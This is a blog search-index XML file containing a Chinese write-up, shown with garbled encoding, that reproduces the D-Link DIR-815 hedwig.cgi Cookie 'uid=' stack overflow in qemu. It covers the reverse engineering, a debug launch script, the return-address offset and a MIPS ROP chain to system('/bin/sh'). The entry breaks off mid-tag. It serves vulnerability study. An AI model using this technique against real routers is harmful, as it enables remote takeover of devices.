<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>D-Link DIR-815è·¯ç”±å™¨æº¢å‡ºæ¼æ´åˆ†æ</title>
      <link href="/posts/d1f081a9.html"/>
      <url>/posts/d1f081a9.html</url>
      
        <content type="html"><![CDATA[<p>ç½‘ä¸Šå…³äº <code>D-Link DIR-815</code> è·¯ç”±å™¨æ¼æ´å¤ç°çš„æ–‡ç« è¿˜æ˜¯è›®å¤šçš„ï¼Œå› æ­¤ç¬¬ä¸€æ¬¡çš„å¤ç°é€‰æ‹©äº†è¿™ä¸ªè½¯æŸ¿å­ğŸ¤”ã€‚å› ä¸ºç›¸å…³æ–‡ç« å¾ˆå¤šçš„ç¼˜æ•…ï¼Œæ‰€ä»¥æˆ‘å°½å¯èƒ½æ¥å†™ä¸€äº›å¤§å¤šæ–‡ç« æ²¡æœ‰æåˆ°çš„ç‚¹ã€‚</p><blockquote><p><strong>æ¼æ´æè¿° ï¼šDIR-815 å›ºä»¶ä¸­çš„ Hedwig.cgi è„šæœ¬ä¸­ï¼Œåœ¨å¤„ç† HTTP å¤´æ—¶ï¼Œå¦‚æœ Cookie å­—æ®µä¸­å« uid&#x3D; çš„å€¼åˆ™å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œä»è€Œè·å¾—è·¯ç”±å™¨è¿œç¨‹æ§åˆ¶æƒé™</strong></p><p><strong>å½±å“ç‰ˆæœ¬ ï¼šDIR-815&#x2F;300&#x2F;600&#x2F;645ç­‰</strong></p></blockquote><p>é¦–å…ˆä¸‹è½½å›ºä»¶ï¼Œç„¶åç”¨ <code>binwalk</code> è§£å‹å‡ºæ¥å¾—åˆ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¾ˆå¤šæ–‡ç« å¯¹è¿™é‡Œè¿›è¡Œäº†è¯¦ç»†ä»‹ç»è¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚</p><h3 id="è¿è¡Œæ—¶æŠ¥é”™"><a href="#è¿è¡Œæ—¶æŠ¥é”™" class="headerlink" title="è¿è¡Œæ—¶æŠ¥é”™"></a>è¿è¡Œæ—¶æŠ¥é”™</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181721376.png" alt="image-20230518172151330"></p><p>è¿™ä¸ªæŠ¥é”™è¯´æ˜æ‰¾ä¸åˆ° <code>libgcc_s.so.1</code> æ–‡ä»¶ï¼Œè§£å†³æ–¹æ³•æ˜¯å°†è§£å‹å›ºä»¶å¾—åˆ°çš„æ–‡ä»¶ç³»ç»Ÿä¸­çš„ <code>/lib</code> ç›®å½•ä¸‹çš„ <code>libgcc_s.so.1</code> æ–‡ä»¶è½¯é“¾æ¥åˆ° <code>/lib</code> ç›®å½•ä¸‹å³å¯</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305190951158.png" alt="image-20230519095103004"></p><p>ç„¶åå†æ¬¡è¿è¡Œå‘ç°å¹¶ä¸æ˜¯åŸæœ¬ç¼ºå°‘ <code>libgcc_s.so.1</code> çš„æŠ¥é”™äº†ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181658971.png" alt="image-20230518165839841"></p><p>çœ‹åˆ°è¿™ä¸ªå­—ç¬¦ä¸²ä¼šæ„Ÿè§‰æœ‰ç‚¹ç†Ÿæ‚‰ï¼Œå°† <code>cgibin</code> æ‹–åˆ° <code>ida</code> é‡Œå‘ç°æ˜¯ç¨‹åºé‡Œæ²¡æœ‰åŒ¹é…åˆ°ç›¸åº”çš„å‡½æ•°ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œå› ä¸ºè¿è¡Œçš„ <code>cgibin</code> ç¨‹åºå¹¶ä¸åœ¨è¿™ä¸ªåŒ¹é…çš„åˆ—è¡¨ä¸­ï¼Œæ­£å¸¸æƒ…å†µä¸‹éƒ½æ˜¯é€šè¿‡è½¯é“¾æ¥æŒ‡å‘çš„è¿™ä¸ªç¨‹åºæ¥æ‰§è¡Œçš„ã€‚æ‰€ä»¥è¦å»æ‰§è¡Œ <code>hedwig.cgi</code> ç¨‹åº</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181659144.png" alt="image-20230518165917093"></p><p>å› ä¸ºå½“åˆ <code>binwalk</code> æå–å®Œå›ºä»¶ï¼Œå…¶ä¸­ <code>hedwig.cgi</code> çš„è½¯é“¾æ¥éƒ½æŒ‡å‘äº† <code>/dev/null</code> ï¼ˆè‡³å°‘æˆ‘çš„æ˜¯è¿™æ ·ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œè¦æŠŠ <code>hedwig.cgi</code> åˆ æ‰ï¼Œé‡æ–°ç”Ÿæˆä¸€ä¸ª <code>cgibin</code> çš„è½¯é“¾æ¥ã€‚</p><p>ä¸‹å›¾ç¨‹åºæ˜¯æˆåŠŸè·‘èµ·æ¥äº†</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181713829.png" alt="image-20230518171306696"></p><h3 id="åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶"><a href="#åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶" class="headerlink" title="åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶"></a>åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p><code>main</code> å‡½æ•°çš„æœ€å¼€å§‹åœ¨åŒ¹é…ç¨‹åºåä»¥æ¥è°ƒç”¨ä¸åŒçš„å‡½æ•°æ¥å®ç°å…·ä½“åŠŸèƒ½ã€‚</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305180744182.png" alt="image-20230518074412983" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3 = *argv;</span><br><span class="line">v6 = <span class="built_in">strrchr</span>(*argv, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v6 )</span><br><span class="line">  v3 = v6 + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;phpcgi&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = (<span class="type">void</span> (__noreturn *)())phpcgi_main;</span><br><span class="line">  v9 = argc;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="type">int</span> (__fastcall *)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">char</span> **))v8)(v9, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥è¿™æ®µä»£ç ä¸ºä¾‹ï¼Œé¦–å…ˆæ ¹æ® <code>*argv</code> è·å–ç¨‹åºçš„åå­—ï¼Œé€šè¿‡ <code>strrchr</code> å‡½æ•°æ¥åŒ¹é…ç¨‹åºåä¸­æœ€åä¸€ä¸ª <code>/</code> å‡ºç°çš„ä½ç½®ï¼Œ <code>v6+1</code> å–çš„æ˜¯ <code>/</code> çš„ä¸‹ä¸€ä¸ªå­—ç¬¦çš„åœ°å€ï¼Œç„¶åæ¥åŒ¹é…æ˜¯å¦ä¸º <code>phpcgi</code> è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œ å¦‚æœæ˜¯çš„è¯åˆ™è·³è½¬åˆ° <code>phpcgi_main</code> å‡½æ•°ï¼Œæ•´ä¸ª <code>main</code> å‡½æ•°éƒ½æ˜¯åœ¨åšè¿™ä¸ªäº‹æƒ…</p><h4 id="hedwigcgi-main"><a href="#hedwigcgi-main" class="headerlink" title="hedwigcgi_main"></a>hedwigcgi_main</h4><p>æ¥ä¸‹æ¥é€æ­¥åˆ†æ <code>hedwigcgi_main</code> å‡½æ•°</p><p><code>sprintf</code> æ˜¯å±é™©å‡½æ•°ï¼Œå°†å­—ç¬¦ä¸²æ ¼å¼åŒ–åæ‹·è´åˆ°æŒ‡å®šå†…å­˜æ—¶æ²¡æœ‰è§„å®šé•¿åº¦å¤§å°ä»è€Œå¯èƒ½å­˜åœ¨æº¢å‡º</p><p>è¿™é‡Œéœ€è¦è®©ç¯å¢ƒå˜é‡ <code>REQUEST_METHOD</code> ä¸º <code>POST</code> ï¼Œå¹¶ä¸”åˆ›å»º <code>/var/tmp/temp.xml</code> æ–‡ä»¶</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210851749.png" alt="image-20230521085117376"></p><p>ä¸Šå›¾ä¸­å‡ºç°çš„ä¸€ä¸ªå…³é”®å‡½æ•°æ˜¯ <code>sess_get_uid</code> ï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†æå–çš„ <code>COOKIE</code> ä¸­ <code>uid=</code> åé¢çš„å­—ç¬¦ä¸²å­˜ä¸º <code>v4</code> çš„ <code>data</code> å­—æ®µã€‚ä¸‹é¢æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªå‡½æ•°</p><h5 id="sess-get-uid"><a href="#sess-get-uid" class="headerlink" title="sess_get_uid"></a>sess_get_uid</h5><p>åœ¨åˆ†æè¿™ä¸ªå‡½æ•°ä¹‹å‰ï¼Œè¿˜éœ€è¦åˆ†æå‰é¢å‡ºç°è¿‡çš„å‡ ä¸ªå‡½æ•° <code>sobj_new</code> <code>sobj_strcmp</code> <code>sobj_add_char</code>  <code>sobj_get_string</code> </p><h5 id="sobj-new"><a href="#sobj-new" class="headerlink" title="sobj_new"></a>sobj_new</h5><p>ç”³è¯·äº†ä¸€å—å †ï¼Œç”¨æ¥å­˜å‚¨ç»“æ„ä½“çš„æ•°æ®ï¼Œä¸»è¦å…³æ³¨çš„æ˜¯ <code>max_len</code>  <code>used_len</code> <code>data</code> è¿™ä¸‰ä¸ªæˆå‘˜ï¼Œå…¶ä»–å‡ ä¸ªä¹‹åé€†å‘åˆ†æçš„æ—¶å€™æ²¡ç”¨åˆ°ï¼ˆè¿™é‡Œæ¯ä¸ªå­—æ®µçš„å«ä¹‰ï¼Œä¸æ˜¯ä¸€ä¸Šæ¥å°±çŸ¥é“çš„ï¼Œè¿™æ˜¯åˆ†æå…¶ä»–å‡½æ•°æ—¶è¿›è¡ŒçŒœæµ‹çš„ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181102504.png" alt="image-20230518110253441" style="zoom:50%;" /><h5 id="sobj-strcmp"><a href="#sobj-strcmp" class="headerlink" title="sobj_strcmp"></a>sobj_strcmp</h5><p>ä¼ å…¥çš„å‚æ•°ä¸€ä¸ªæ˜¯ <code>sobj_new</code> è¿”å›çš„ç»“æ„ä½“æŒ‡é’ˆï¼Œå¦ä¸€ä¸ªæ˜¯å­—ç¬¦ä¸²æŒ‡é’ˆï¼Œåˆ¤æ–­ç»“æ„ä½“çš„ <code>data</code> å­—æ®µå­˜å‚¨çš„å­—ç¬¦ä¸²æ˜¯å¦å’Œä¼ å…¥çš„å­—ç¬¦ä¸²ä¸€æ ·</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181117507.png" alt="image-20230518111747463" style="zoom:50%;" /><h5 id="sobj-add-char"><a href="#sobj-add-char" class="headerlink" title="sobj_add_char"></a>sobj_add_char</h5><p>ä¼ å…¥äº† <code>sobj_new</code> è¿”å›çš„ç»“æ„ä½“æŒ‡é’ˆï¼Œå¦ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ã€‚é¦–å…ˆåˆ¤æ–­ç»“æ„ä½“æŒ‡é’ˆæ˜¯å¦å­˜åœ¨ï¼Œ<code>max_len</code> æ˜¯å¦ç­‰äº <code>used_len</code> ã€‚å¦‚æœç¬¦åˆæ¡ä»¶çš„è¯å°†å­—ç¬¦ <code>ch</code> å†™å…¥åˆ° <code>data</code> å­—æ®µä¸­ï¼Œå¹¶ä¸”è®© <code>used_len</code> å­—æ®µåŠ ä¸€ã€‚</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181126711.png" alt="image-20230518112641661" style="zoom:50%;" /><h5 id="sobj-get-string"><a href="#sobj-get-string" class="headerlink" title="sobj_get_string"></a>sobj_get_string</h5><p>è¯¥å‡½æ•°ç”¨äºè¿”å›ä¼ å…¥çš„ç»“æ„ä½“æŒ‡é’ˆä¸­ <code>data</code> åŸŸçš„æŒ‡é’ˆ</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181132195.png" alt="image-20230518113206147" style="zoom:50%;" /><p>ç°åœ¨æ¥åˆ†æ <code>sess_get_uid</code> </p><p>å‡½æ•°æœ€å¼€å§‹è¿›è¡Œäº†ä¸€äº›åˆå§‹åŒ–å’Œåˆ¤æ–­ï¼ŒåŒæ—¶æ‹¿åˆ°äº†ç¯å¢ƒå˜é‡ <code>HTTP_COOKIE</code> å€¼çš„æŒ‡é’ˆï¼Œå¹¶è®¾ç½®   <code>state</code> ï¼ˆ çŠ¶æ€ä½ï¼‰ä¸º <code>0</code></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181110826.png" alt="image-20230518111058786" style="zoom:50%;" /><p>è¯¥å‡½æ•°å…·ä½“åŠŸèƒ½æ˜¯é€šè¿‡é€ä¸ªæ‰«æ <code>COOKIE</code> çš„å­—ç¬¦ï¼Œæ¥å¯»æ‰¾ <code>=</code> ï¼Œå¦‚æœæ‰¾åˆ°äº† <code>=</code> åˆ™è®¾ç½® <code>state</code> ä¸º <code>2</code> ï¼Œä¹‹åå†æ‰«æå­—ç¬¦çš„æ—¶å€™å› ä¸º <code>state</code> ä¸º <code>2</code> çš„ç¼˜æ•…ï¼Œéƒ½ä¼šè¿›å…¥å¦ä¸€ä¸ªåˆ†æ”¯ï¼Œå»å°†æ‰«æ <code>COOKIE</code> çš„å­—ç¬¦å­˜å‚¨åˆ° <code>v4</code> ç»“æ„ä½“çš„ <code>data</code> æˆå‘˜ä¸­ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ° <code>=</code> é‚£ä¹ˆ <code>state</code> ä¸€ç›´ä¸º <code>1</code> ï¼Œåˆ™å§‹ç»ˆå°† <code>COOKIE</code> çš„å­—ç¬¦å­˜å‚¨åˆ° <code>v2</code> ç»“æ„ä½“çš„ <code>data</code> æˆå‘˜ä¸­ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p>å½“æ‰«æå®Œ <code>COOKIE</code> çš„æ‰€æœ‰å­—ç¬¦åï¼Œå»åˆ¤æ–­ <code>v2</code> ç»“æ„ä½“çš„ <code>data</code> æˆå‘˜æ˜¯å¦ä¸ºå­—ç¬¦ä¸² <code>uid</code> ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°±å°† <code>v4</code> ç»“æ„ä½“ä¹‹å‰å­˜å‚¨çš„å­—ç¬¦ä¸²å†™åˆ°ç»“æ„ä½“ <code>a1</code> çš„ <code>data</code> åŸŸä¸­ã€‚ï¼ˆ <code>a1</code> ä¹Ÿå°±æ˜¯ <code>sess_get_uid</code> å‡½æ•°ä¼ å…¥çš„ç»“æ„ä½“æŒ‡é’ˆï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210943265.png" alt="image-20230521094300133" style="zoom: 67%;" /><p>å†å›åˆ° <code>hedwigcgi_main</code> å‡½æ•°ä¸Šï¼Œç°åœ¨æƒ³æ‰§è¡Œåˆ°çœŸæ­£åˆ©ç”¨çš„æº¢å‡ºç‚¹ï¼Œéœ€è¦æ§åˆ¶ <code>haystack</code> çš„å€¼æ‰è¡Œï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210954878.png" alt="image-20230521095402701" style="zoom:50%;" /> <h4 id="æ§åˆ¶-haystack"><a href="#æ§åˆ¶-haystack" class="headerlink" title="æ§åˆ¶ haystack"></a>æ§åˆ¶ <code>haystack</code></h4><p>é€šè¿‡æŸ¥çœ‹ <code>haystack</code> çš„äº¤å‰å¼•ç”¨ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œå‘ç°åªæœ‰ä¸€ä¸ªåœ°æ–¹å¯ä»¥å¯¹ <code>haystack</code> è¿›è¡Œèµ‹å€¼</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210959344.png" alt="image-20230521095927264" style="zoom:67%;" /><p>è·³è½¬è¿‡å»åˆ°äº† <code>409A6C</code> å‡½æ•°</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211000998.png" alt="image-20230521100001952" style="zoom:50%;" /><p>å¦‚æœè®°æ€§ä¸é”™çš„è¯åº”è¯¥èƒ½æƒ³èµ·æ¥å®ƒæ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œåœ¨ <code>hedwigcgi_main</code> å‡½æ•°ä¸­å‡ºç°è¿‡ <code>cgibin_parse_request((int)sub_409A6C, 0, 0x20000u);</code> å› æ­¤å°±è¦å»åˆ†æ <code>cgibin_parse_request</code> å‡½æ•°ï¼Œçœ‹çœ‹æ˜¯ä½•æ—¶è°ƒç”¨äº† <code>409A6C</code> å‡½æ•°</p><h5 id="cgibin-parse-request"><a href="#cgibin-parse-request" class="headerlink" title="cgibin_parse_request"></a>cgibin_parse_request</h5><p>è¿™é‡Œæ˜¯ <code>cgibin_parse_request</code> å‡½æ•°çš„åéƒ¨åˆ†ï¼Œå‰éƒ¨åˆ†è¦æ»¡è¶³ <code>CONTENT_LENGTH &lt; 0x20000</code> å’Œ <code>REQUEST_URI</code> è¿™ä¸ªå€¼è¦å­˜åœ¨ï¼Œè¿™æ ·æ‰èƒ½èµ°åˆ°ä¸‹é¢è¿™éƒ¨åˆ†</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211014282.png" alt="image-20230521101434200" style="zoom: 67%;" /><p>è¿™é‡Œè®¾ç½® <code>CONTENT_TYPE</code> ä¸º <code>aApplication</code> ï¼Œæœ€åä¼šè°ƒç”¨ <code>0x42C014[2]</code> ä½ç½®çš„æŒ‡é’ˆï¼Œè¯¥å‡½æ•°æŒ‡é’ˆå°±æ˜¯ <code>0x403B10</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211050021.png" alt="image-20230521105041949"></p><p>ä¹‹åç»™ä¸ªåˆ†æçš„æ€è·¯å§ï¼Œ å®åœ¨ä¸æƒ³å†™è¿™ä¹ˆè¯¦ç»†äº†ã€‚</p><p>è¿›å…¥ <code>403B10</code> å‡½æ•°ï¼Œé¦–å…ˆ <code>CONTENT_TYPE</code> åœ¨åŸæœ¬çš„ <code>aApplication</code> åé¢è¦å†åŠ ä¸Šå­—ç¬¦ä¸² <code>x-www-form-urlencoded</code> æ‰èƒ½è¿›å…¥ä¸»é€»è¾‘éƒ¨åˆ†ã€‚ <code>read</code> ä¼šè¯»å…¥ <code>0xc</code> ä¸ªæ•°æ®ï¼Œç„¶åå°†è¿™ä¸ªè¾“å…¥çš„æ•°æ®ä½œä¸ºå‚æ•°è°ƒç”¨ <code>402B40</code> å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å°†åˆšåˆšè¯»å…¥çš„æ•°æ®ï¼Œä»¥ <code>=</code> è¿›è¡Œåˆ†å‰²ã€‚æ¥ç€è°ƒç”¨äº†å‡½æ•°æŒ‡é’ˆ <code>v9</code> ï¼ˆè¿™ä¸ª <code>v9</code> å°±æ˜¯æœ€å¼€å§‹æ‰€è¯´çš„å›è°ƒå‡½æ•° <code>409A6C</code> ï¼‰ï¼Œè€Œåˆšåˆš <code>=</code> å‰é¢çš„æ•°æ®ä¼šè¢«å½“åšå‚æ•°ä¼ è¿›æ¥ï¼Œä¸‹é¢å†çœ‹ä¸€ä¸‹ <code>409A6c</code> å‡½æ•°</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211102535.png" alt="image-20230521110226484"></p><p>å› æ­¤åªè¦èµ°åˆ°è¿™é‡Œï¼Œ<code>haystack</code> å°±ä¼šè¢«èµ‹å€¼æˆ <code>=</code> å‰é¢å­—ç¬¦ä¸²çš„åœ°å€ã€‚ä»è€Œç»•è¿‡ <code>if ( !haystack )</code> è¿™ä¸ªåˆ¤æ–­ã€‚</p><p>æ€»ç»“ä¸€ä¸‹èµ‹å€¼ <code>haystack</code> çš„å‡½æ•°è°ƒç”¨é“¾ ï¼š<code>cgibin_parse_requeset -&gt; 403b10 -&gt; 402b40 -&gt; å‡½æ•°æŒ‡é’ˆv9</code> ï¼Œåˆå­¦è€…å¯ä»¥è‡ªè¡Œå»è¯¦ç»†åˆ†æä¸Šè¿°è¿‡ç¨‹ã€‚</p><h3 id="qemu-ç”¨æˆ·æ¨¡å¼ä¸‹å¤ç°"><a href="#qemu-ç”¨æˆ·æ¨¡å¼ä¸‹å¤ç°" class="headerlink" title="qemu ç”¨æˆ·æ¨¡å¼ä¸‹å¤ç°"></a><code>qemu</code> ç”¨æˆ·æ¨¡å¼ä¸‹å¤ç°</h3><h4 id="ROP-é“¾çš„å¸ƒç½®"><a href="#ROP-é“¾çš„å¸ƒç½®" class="headerlink" title="ROP é“¾çš„å¸ƒç½®"></a><code>ROP</code> é“¾çš„å¸ƒç½®</h4><p>ç°åœ¨æ˜¯è‚¯å®šèƒ½èµ°åˆ°ç¬¬äºŒæ¬¡çš„ <code>sprintf</code> è¿›è¡Œæº¢å‡ºäº†ã€‚ç°åœ¨æˆ‘ä»¬æ¥æµ‹ä¸€ä¸‹æº¢å‡ºæ§åˆ¶è¿”å›åœ°å€çš„åç§»é‡æ˜¯å¤šå°‘ã€‚</p><h5 id="å¦‚ä½•è°ƒè¯•"><a href="#å¦‚ä½•è°ƒè¯•" class="headerlink" title="å¦‚ä½•è°ƒè¯•"></a>å¦‚ä½•è°ƒè¯•</h5><p>å…ˆå‡†å¤‡ä¸€ä¸ª <code>payload</code> æ–‡ä»¶ï¼Œé‡Œé¢æ”¾å…¥ <code>COOKIE</code> çš„å€¼ï¼Œè¿™é‡Œç›´æ¥ç”¨ <code>cyclic 2000 &gt; payload</code> ï¼Œä¸è¿‡åˆ«å¿˜è®°åœ¨æœ€å¼€å§‹åŠ ä¸€ä¸ª <code>uid=</code> å­—ç¬¦ä¸²</p><p>ç„¶åå†™ä¸€ä¸ªå¯åŠ¨è„šæœ¬ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œè¿™é‡Œç®€å•è¯´æ˜ä¸€ä¸‹è¿™ä¸ªè„šæœ¬ã€‚é¦–å…ˆä½¿ç”¨ <code>chroot</code> å‘½ä»¤å°†å½“å‰ç›®å½• <code>squashfs-root</code> è®¾ç½®ä¸ºæ ¹ç›®å½•ï¼Œå› ä¸ºç¨‹åºæ‰“å¼€çš„æ–‡ä»¶éƒ½æ˜¯ç›¸å¯¹äºè¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿæ¥è¯´çš„ã€‚ä¸€æ—¦å°† <code>squashfs-root</code> è®¾ç½®ä¸ºæ ¹ç›®å½•ï¼Œé‚£ä¹ˆ <code>qemu-mipsel</code>  å°±æ²¡åŠæ³•ä½¿ç”¨äº†ï¼Œå› ä¸ºä¾èµ–äº†å…¶ä»–ç›®å½•çš„åº“æ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨é™æ€é“¾æ¥çš„ <code>qemu-mipsel-static</code> ï¼ˆæˆ‘çš„ <code>ubuntu 18.04</code> ä¸Šç”¨ <code>apt-get install</code> å®‰è£…çš„ <code>qemu-mipsel-static</code> ä¼šæŠ¥ä¸€ä¸ªé”™è¯¯</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211510370.png" alt="image-20230521151058316"></p><p>åŸå› æ˜¯è¿™ä¸ª <code>qemu-mipsel-static</code> ç‰ˆæœ¬å¤ªä½ï¼Œæˆ‘çš„è§£å†³æ–¹æ³•æ˜¯åœ¨ <code>ubuntu 22.04</code> ä¸Šå®‰è£…åï¼Œæ‹–åˆ°äº† <code>18.04</code> ä¸Šï¼‰  </p><p><code>-E</code> ç”¨äºæŒ‡å®šè¦åœ¨æ¨¡æ‹Ÿçš„è™šæ‹Ÿæœºä¸­è®¾ç½®çš„ç¯å¢ƒå˜é‡ï¼Œè€Œè¿™äº›å˜é‡æ˜¯å‰é¢åˆ†æè¿‡çš„ï¼Œè¿›è¡Œè®¾ç½®å³å¯,å‰©ä¸‹çš„å°±å’Œè°ƒè¯• <code>MIPS</code> æ¶æ„çš„ç¨‹åºä¸€æ ·äº†ï¼Œæœ‰éœ€è¦çš„è¯å¯ä»¥æŸ¥çœ‹è¿™ç¯‡ <a href="https://zikh26.github.io/posts/919c29c4.html#%E7%9B%B4%E6%8E%A5%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F">æ–‡ç« </a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">payload=$(echo &quot;$(cat payload)&quot;)</span><br><span class="line">sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=666 -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$payload -E REQUEST_URL=&quot;zikh26&quot;  -g 1234 /htdocs/web/hedwig.cgi </span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211147020.png" alt="image-20230521114724909"></p><p>å‘ç°è¦†ç›–åˆ°è¿”å›åœ°å€éœ€è¦å¡«å…… <code>1043</code> çš„åƒåœ¾æ•°æ®ã€‚</p><p>é€šè¿‡è§‚å¯Ÿå‡½æ•°æœ€åè¿”å›å¤„çš„æ±‡ç¼–ï¼Œè¿™é‡Œæ˜¯å¯ä»¥æ§åˆ¶å¾ˆå¤šå¯„å­˜å™¨ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯è¦é€šè¿‡è¿™äº›å¯æ§çš„å¯„å­˜å™¨æ¥å®Œæˆ <code>ROP</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211148333.png" alt="image-20230521114847280"></p><h5 id="ROP-system"><a href="#ROP-system" class="headerlink" title="ROP-system"></a>ROP-system</h5><p>å› ä¸ºè¿™ä¸ªç¨‹åºçš„æº¢å‡ºæ˜¯ <code>sprintf</code> å¯¼è‡´çš„ï¼Œ <code>\x00</code> å¯ä»¥é€ æˆå­—ç¬¦ä¸²çš„æˆªæ–­ï¼Œè€Œ <code>system</code> å‡½æ•°åœ°å€æœ«å°¾å°±æ˜¯ <code>\x00</code> ï¼Œä¸ºäº†é¿å…è¢«æˆªæ–­ï¼Œæˆ‘ä»¬è¦å…ˆè®© <code>system</code> å‡½æ•°çš„åœ°å€å‡ä¸€æ”¾å…¥ä¸€ä¸ªå¯„å­˜å™¨ï¼Œä¹‹åè·³è½¬åˆ°èƒ½è®©è¿™ä¸ªå¯„å­˜å™¨åŠ ä¸€çš„ <code>gadget</code> ä¸Šã€‚<code>MIPS</code> æ¶æ„çš„ <code>ROP</code> æ˜¯é€šè¿‡å¯„å­˜å™¨é—´çš„è·³è½¬å®ç°çš„ï¼Œè€Œ <code>x86</code> ä¸­é€šå¸¸æ˜¯ç”¨ <code>ret</code> æŒ‡ä»¤æ ¹æ®æ ˆä¸­å­˜æ”¾çš„æ•°æ®æ¥è·³è½¬çš„ã€‚</p><p>åœ¨ ã€Šæ­ç§˜å®¶ç”¨è·¯ç”±å™¨0dayæ¼æ´æŒ–æ˜æŠ€æœ¯ã€‹ä¸€ä¹¦ä¸­å¯¹è¯¥ <code>ROP</code>  é“¾å¸ƒå±€ç”»çš„ååˆ†å½¢è±¡ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œå› ä¸ºä¸Šé¢æåˆ°äº†æˆ‘ä»¬èƒ½æ§åˆ¶å¾ˆå¤šå¯„å­˜å™¨ï¼Œå°±å…ˆåœ¨ <code>$ra</code> å¯„å­˜å™¨å¸ƒç½®ä¸€ä¸ªè®© <code>$s0</code> åŠ ä¸€çš„ <code>gadget</code> ï¼ˆæå‰æ§åˆ¶ <code>$s0</code> ä¸º <code>system</code> å‡ä¸€çš„åœ°å€ï¼‰ï¼Œæ¥ç€è·³è½¬åˆ°ä¸€æ®µèƒ½èµ‹å€¼æ ˆåœ°å€çš„ <code>gadget</code> ä¸Šï¼ˆç”¨äºæŒ‡å‘ <code>/bin/sh</code> ï¼‰ï¼Œæœ€åè·³å›åˆ° <code>system</code> ä¸Š</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211441230.png" alt="image-20230521144117106"></p><p>è¡¥å……ï¼š</p><ol><li>ç¨‹åºä¾èµ–çš„ <code>libc</code> æ˜¯è½¯é“¾æ¥ <code>libc.so.0</code> æŒ‡å‘çš„ <code>libuClibc-0.9.30.1.so</code> ï¼Œå› æ­¤ <code>gadget</code> è¦å»è¿™ä¸ªé‡Œé¢æ‰¾</li><li>æ‰¾ <code>gadget</code> çš„è¯ï¼Œç”¨ <code>IDA</code> æ’ä»¶ <code>mipsrop</code> ã€‚ä»¥ä¸Šé¢ä¸¤æ®µ <code>gadget</code> ä¸ºä¾‹ï¼Œæœå¯„å­˜å™¨åŠ ä¸€çš„æŒ‡ä»¤å¯ä»¥è¿™ä¹ˆæœ <code>mipsrop.find(&quot;addiu .*,1&quot;)</code> ï¼Œå½“ç„¶äº†å¯èƒ½ä¼šå‡ºç°ä¸‹é¢çš„æŠ¥é”™</li></ol><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211457716.png" 